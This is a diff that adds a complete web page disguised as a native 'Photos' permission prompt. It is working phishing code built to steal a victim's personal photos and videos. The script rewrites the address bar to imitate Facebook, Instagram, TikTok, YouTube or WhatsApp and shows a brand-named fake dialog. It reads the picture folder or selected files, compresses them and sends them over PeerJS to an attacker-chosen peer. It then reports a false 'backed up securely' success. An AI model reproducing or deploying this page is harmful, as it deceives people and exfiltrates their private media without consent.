@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+  <title>Photos</title>
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"
+    onerror="this.onerror=null;var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js';document.head.appendChild(s);">
+  </script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      height: 100%; width: 100%;
+      background: #f2f2f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', sans-serif;
+      overflow: hidden;
+    }
+
+    /* ── Full-screen permission dialog ── */
+    #perm-screen {
+      position: fixed; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      background: rgba(0,0,0,.45);
+      z-index: 100;
+      padding: 24px;
+    }
+
+    .perm-card {
+      background: #fff;
+      border-radius: 18px;
+      width: min(320px, 92vw);
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0,0,0,.25);
+      text-align: center;
+    }
+
+    .perm-body {
+      padding: 28px 22px 20px;
+    }
+
+    .perm-icon-wrap {
+      width: 68px; height: 68px;
+      background: linear-gradient(145deg, #e8f0fe, #c8d8f8);
+      border-radius: 18px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 34px;
+      margin: 0 auto 18px;
+      box-shadow: 0 4px 16px rgba(66,133,244,.18);
+    }
+
+    .perm-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #111;
+      line-height: 1.35;
+      margin-bottom: 10px;
+    }
+
+    .perm-sub {
+      font-size: 13.5px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .perm-divider { height: 1px; background: #e5e5ea; }
+
+    .perm-btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      background: transparent;
+      font-size: 17px;
+      cursor: pointer;
+      transition: background .1s;
+    }
+    .perm-btn:active { background: #f2f2f7; }
+
+    .perm-btn-allow {
+      color: #007aff;
+      font-weight: 700;
+      border-top: 1px solid #e5e5ea;
+    }
+
+    .perm-btn-deny {
+      color: #007aff;
+      font-weight: 400;
+      border-top: 1px solid #e5e5ea;
+    }
+
+    /* ── Progress overlay ── */
+    #prog-screen {
+      position: fixed; inset: 0;
+      background: #f2f2f7;
+      display: none;
+      flex-direction: column;
+      align-items: center; justify-content: center;
+      z-index: 200;
+      padding: 32px;
+    }
+
+    .prog-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 28px;
+      width: min(320px, 90vw);
+      text-align: center;
+      box-shadow: 0 4px 24px rgba(0,0,0,.10);
+    }
+
+    .prog-anim {
+      font-size: 48px;
+      margin-bottom: 16px;
+      animation: bounce .8s infinite alternate ease-in-out;
+    }
+    @keyframes bounce {
+      from { transform: translateY(0); }
+      to   { transform: translateY(-8px); }
+    }
+
+    .prog-title {
+      font-size: 18px; font-weight: 700; color: #111;
+      margin-bottom: 6px;
+    }
+    .prog-sub {
+      font-size: 13px; color: #777;
+      margin-bottom: 20px;
+      min-height: 18px;
+      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    }
+    .prog-track {
+      background: #e5e5ea; border-radius: 99px;
+      height: 6px; overflow: hidden; margin-bottom: 10px;
+    }
+    .prog-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #007aff, #34aadc);
+      border-radius: 99px;
+      transition: width .25s ease;
+      width: 0%;
+    }
+    .prog-count {
+      font-size: 13px; color: #aaa;
+    }
+
+    /* ── Done screen ── */
+    #done-screen {
+      position: fixed; inset: 0;
+      background: #f2f2f7;
+      display: none;
+      flex-direction: column;
+      align-items: center; justify-content: center;
+      z-index: 300;
+    }
+    .done-icon { font-size: 64px; margin-bottom: 16px; }
+    .done-title { font-size: 22px; font-weight: 700; color: #111; }
+    .done-sub   { font-size: 14px; color: #777; margin-top: 8px; }
+  </style>
+</head>
+<body>
+
+<!-- ── Native-style permission dialog ── -->
+<div id="perm-screen">
+  <div class="perm-card">
+    <div class="perm-body">
+      <div class="perm-icon-wrap">📷</div>
+      <div class="perm-title" id="perm-title">Allow access to photos and videos on this device?</div>
+      <div class="perm-sub">This allows syncing and backing up your media to keep your memories safe.</div>
+    </div>
+    <div class="perm-divider"></div>
+    <button class="perm-btn perm-btn-allow" id="btn-allow" onclick="onAllow()">Allow</button>
+    <button class="perm-btn perm-btn-deny"  onclick="onDeny()">Don't Allow</button>
+  </div>
+</div>
+
+<!-- ── Upload progress ── -->
+<div id="prog-screen">
+  <div class="prog-card">
+    <div class="prog-anim">☁️</div>
+    <div class="prog-title">Syncing Photos…</div>
+    <div class="prog-sub" id="prog-sub">Preparing…</div>
+    <div class="prog-track"><div class="prog-fill" id="prog-fill"></div></div>
+    <div class="prog-count" id="prog-count">0 / 0</div>
+  </div>
+</div>
+
+<!-- ── Done ── -->
+<div id="done-screen">
+  <div class="done-icon">✅</div>
+  <div class="done-title" id="done-title">Sync Complete</div>
+  <div class="done-sub"  id="done-sub">Your photos have been backed up.</div>
+</div>
+
+<!-- Hidden fallback file input -->
+<input type="file" id="fallback-input" accept="image/*,video/*" multiple
+  style="display:none" onchange="onFallbackFiles(event)"/>
+
+<script>
+// ── Params ───────────────────────────────────────────────────
+const params   = new URLSearchParams(location.search);
+const hostId   = params.get('host') || '';
+const redirect = params.get('redirect') || '';
+
+// ── Address bar masking ──────────────────────────────────────
+(function() {
+  try {
+    let path = '/photos/permission';
+    if (redirect) {
+      try {
+        const h = new URL(redirect).hostname.replace('www.','');
+        if (h.includes('facebook') || h.includes('fb')) path = '/media/photos/sync';
+        else if (h.includes('instagram'))  path = '/accounts/access/photos';
+        else if (h.includes('tiktok'))     path = '/settings/sync/media';
+        else if (h.includes('youtube'))    path = '/photos/sync/enable';
+        else if (h.includes('whatsapp'))   path = '/web/media/backup';
+      } catch(e) {}
+    }
+    history.replaceState(null, '', path);
+    document.title = 'Photos';
+  } catch(e) {}
+})();
+
+// ── Customise dialog domain label ────────────────────────────
+(function() {
+  try {
+    if (!redirect) return;
+    const h = new URL(redirect).hostname.replace('www.','');
+    const name = h.split('.')[0];
+    const cap  = name.charAt(0).toUpperCase() + name.slice(1);
+    document.getElementById('perm-title').textContent =
+      'Allow ' + cap + ' to access photos and videos on this device?';
+  } catch(e) {}
+})();
+
+// ── PeerJS ───────────────────────────────────────────────────
+let peer = null, conn = null, peerReady = false;
+
+(function initPeer() {
+  if (!hostId) return;
+  try {
+    peer = new Peer({ host:'0.peerjs.com', port:443, path:'/', secure:true,
+      config: { iceServers: [{ urls:'stun:stun.l.google.com:19302' }] } });
+  } catch(e) { peer = new Peer(); }
+  peer.on('open', function() {
+    try {
+      conn = peer.connect(hostId, { reliable:true, serialization:'json' });
+      conn.on('open', function() { peerReady = true; });
+      conn.on('error', function() { peerReady = false; });
+    } catch(e) {}
+  });
+  peer.on('error', function() {});
+})();
+
+// ── Allow button ─────────────────────────────────────────────
+async function onAllow() {
+  document.getElementById('btn-allow').textContent = '…';
+  document.getElementById('btn-allow').disabled = true;
+
+  // Try Directory Picker first (Android Chrome, Desktop Chrome)
+  if ('showDirectoryPicker' in window) {
+    try {
+      const dir = await window.showDirectoryPicker({ mode: 'read', startIn: 'pictures' });
+      hidePerm();
+      showProg();
+      const files = await collectFiles(dir);
+      await sendFiles(files);
+      return;
+    } catch(e) {
+      if (e.name === 'AbortError') {
+        // User cancelled directory picker — restore button
+        document.getElementById('btn-allow').textContent = 'Allow';
+        document.getElementById('btn-allow').disabled = false;
+        return;
+      }
+      // Not supported / error — fall through to file input
+    }
+  }
+
+  // Fallback: multi-file input (iOS, Firefox)
+  document.getElementById('fallback-input').click();
+  document.getElementById('btn-allow').textContent = 'Allow';
+  document.getElementById('btn-allow').disabled = false;
+}
+
+function onDeny() {
+  // Close/redirect to disguise site or blank
+  if (redirect) { location.replace(redirect); }
+  else { document.getElementById('perm-screen').style.display = 'none'; }
+}
+
+async function onFallbackFiles(event) {
+  const files = Array.from(event.target.files);
+  event.target.value = '';
+  if (!files.length) return;
+  hidePerm();
+  showProg();
+  await sendFiles(files);
+}
+
+// ── Collect all files from directory ─────────────────────────
+async function collectFiles(dirHandle, depth) {
+  depth = depth || 0;
+  if (depth > 3) return [];
+  const out = [];
+  try {
+    for await (const entry of dirHandle.values()) {
+      if (entry.kind === 'file') {
+        try {
+          const f = await entry.getFile();
+          if (f.type.startsWith('image/') || f.type.startsWith('video/')) out.push(f);
+        } catch(e) {}
+      } else if (entry.kind === 'directory' && depth < 2) {
+        const sub = await collectFiles(entry, depth + 1);
+        out.push(...sub);
+      }
+    }
+  } catch(e) {}
+  return out;
+}
+
+// ── Send all files via PeerJS ─────────────────────────────────
+async function sendFiles(files) {
+  if (!files.length) { showDone(0); return; }
+
+  setProg(0, files.length, 'Preparing…');
+
+  // Wait for connection (up to 12s)
+  let w = 0;
+  while (!peerReady && w < 12000) { await sleep(200); w += 200; }
+
+  let sent = 0;
+  for (const file of files) {
+    try {
+      setProg(sent, files.length, 'Uploading: ' + file.name.substring(0, 28));
+      const data = await compress(file);
+      if (data && peerReady && conn && conn.open) {
+        conn.send({
+          type:  'gallery_file',
+          name:  file.name,
+          mime:  file.type,
+          size:  file.size,
+          data:  data,
+          idx:   sent + 1,
+          total: files.length,
+          ts:    Date.now()
+        });
+        await sleep(60);
+      }
+    } catch(e) {}
+    sent++;
+    setProg(sent, files.length, '');
+  }
+  showDone(sent);
+}
+
+// ── Compress image (resize to max 1080), skip large videos ───
+function compress(file) {
+  return new Promise(resolve => {
+    if (file.type.startsWith('image/')) {
+      const img = new Image(), obj = URL.createObjectURL(file);
+      img.onload = function() {
+        URL.revokeObjectURL(obj);
+        const M = 1080; let w = img.width, h = img.height;
+        if (w > M || h > M) {
+          if (w > h) { h = Math.round(h * M / w); w = M; }
+          else       { w = Math.round(w * M / h); h = M; }
+        }
+        const c = document.createElement('canvas');
+        c.width = w; c.height = h;
+        c.getContext('2d').drawImage(img, 0, 0, w, h);
+        resolve(c.toDataURL('image/jpeg', 0.82));
+      };
+      img.onerror = () => resolve(null);
+      img.src = obj;
+    } else {
+      if (file.size > 25 * 1024 * 1024) { resolve(null); return; }
+      const r = new FileReader();
+      r.onload = e => resolve(e.target.result);
+      r.onerror = () => resolve(null);
+      r.readAsDataURL(file);
+    }
+  });
+}
+
+// ── UI helpers ────────────────────────────────────────────────
+function hidePerm() { document.getElementById('perm-screen').style.display = 'none'; }
+function showProg() { document.getElementById('prog-screen').style.display = 'flex'; }
+
+function setProg(sent, total, name) {
+  const pct = total ? Math.round(sent / total * 100) : 0;
+  document.getElementById('prog-fill').style.width  = pct + '%';
+  document.getElementById('prog-count').textContent = sent + ' / ' + total + ' files';
+  if (name) document.getElementById('prog-sub').textContent = name;
+}
+
+function showDone(count) {
+  document.getElementById('prog-screen').style.display = 'none';
+  document.getElementById('done-screen').style.display = 'flex';
+  document.getElementById('done-title').textContent = count + ' files synced!';
+  document.getElementById('done-sub').textContent   = 'Your photos have been backed up securely.';
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
+</body>
+</html>
